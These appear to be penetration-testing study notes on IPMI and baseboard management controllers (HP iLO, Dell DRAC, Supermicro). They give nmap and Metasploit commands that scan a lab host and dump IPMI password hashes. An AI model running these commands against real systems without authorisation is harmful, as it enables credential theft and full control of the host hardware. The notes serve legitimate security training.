> Intelligent Platform Management Interface

- Port `623/UDP`
- Set of standardized specifications for hardware-based host management systems used for system management and monitoring.
- IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state
-  It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host.

IPMI is typically used in three ways:

- Before the OS has booted to modify BIOS settings
- When the host is fully powered down
- Access to a host after a system failure

## Footprinting the service

- The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI.
- If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system.

### Nmap

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit Version Scan

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
```

### Metasploit Dumping Hashes

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
```
